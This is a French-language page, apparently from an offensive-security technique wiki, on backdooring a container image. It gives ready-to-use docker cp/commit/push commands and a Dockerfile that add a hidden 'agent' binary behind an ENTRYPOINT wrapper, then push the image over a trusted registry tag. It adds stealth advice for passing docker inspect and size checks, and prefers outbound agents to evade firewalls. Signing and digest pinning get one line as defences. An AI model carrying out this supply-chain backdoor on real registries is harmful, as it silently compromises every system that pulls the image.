---
order: 2
title: "Backdoor d'image : modifier une image pour exécuter du code attaquant au lancement"
description: "Un attaquant disposant d'un accès en écriture à une image ou à son tag de registre la reconstruit ou la repackage pour y ajouter une charge utile persistante : un entrypoint altéré qui lance une porte dérobée aux côtés du vrai processus, une couche injectée, ou des binaires modifiés. Chaque conteneur démarré depuis l'image piégée exécute le code de l'attaquant, généralement sans changer visiblement le comportement de l'application."
keywords:
  - backdoor d'image
  - entrypoint
  - injection de couche
  - docker commit
  - chaîne d'approvisionnement
---

# Backdoor d'image

Backdoorer une image fait exécuter du code attaquant à chaque conteneur lancé depuis elle. Contrairement à l'empoisonnement d'image de base, qui cible un amont pour atteindre de nombreux avals, cette technique modifie une image spécifique qu'un attaquant peut réécrire, qu'il s'agisse d'une image applicative largement tirée ou d'une image qu'il poussera sur un tag de confiance. L'art consiste à ajouter la charge utile sans casser l'application, pour que la porte dérobée survive à la revue et à l'usage normal.

## Ajouter la charge utile

```bash
# 1. Repack an existing image: run it, add the payload, commit a new image
docker run --name t <image> sleep 1
docker cp agent t:/usr/local/bin/.a
docker commit --change 'ENTRYPOINT ["/bin/sh","-c","/usr/local/bin/.a & exec \"$@\"","--"]' \
  t <registry>/<image>:<tag>
docker push <registry>/<image>:<tag>
```

```dockerfile
# 2. Rebuild from a Dockerfile with an entrypoint wrapper and an injected layer
FROM <image>
COPY agent /usr/local/bin/.a
RUN chmod +x /usr/local/bin/.a
ENTRYPOINT ["/bin/sh","-c","/usr/local/bin/.a & exec \"$@\"","--"]
```

Le wrapper lance la charge utile en arrière-plan puis fait un `exec` de la commande d'origine, de sorte que le comportement visible du conteneur est inchangé pendant que la porte dérobée s'exécute.

## Rester discret

```bash
# match the original entrypoint/cmd so docker inspect looks normal
docker inspect <orig> | jq '.[0].Config.Entrypoint, .[0].Config.Cmd'
# name the payload to blend in and avoid new exposed ports
# keep the image size plausible; a huge new layer is a tell
```

## Notes d'exploitation

- Préserver l'entrypoint et la commande d'origine derrière le wrapper est ce qui empêche la porte dérobée de casser l'application et de se démarquer dans `docker inspect`.
- Pousser par-dessus un tag de confiance existant (`<image>:<tag>`) est la livraison ; combinez avec [Unauthenticated registry access](unauthenticated-registry-access.md) ou [Registry access](registry-access.md) pour l'écriture.
- Un agent sortant persistant est plus fiable qu'un écouteur exposé, car les réseaux de conteneurs et les pare-feux bloquent souvent les connexions entrantes mais autorisent la sortie.
- La signature d'image et l'épinglage de digest (Docker Content Trust, cosign) brisent cette technique lorsqu'ils sont imposés en aval ; les tags non signés tirés par nom sont le cas exposé.

## Références

- [Docker: commit and content trust](https://docs.docker.com/reference/cli/docker/image/commit/)
- [Sigstore cosign: image signing](https://docs.sigstore.dev/cosign/overview/)
- [SLSA: supply-chain threats](https://slsa.dev/spec/v1.0/threats)
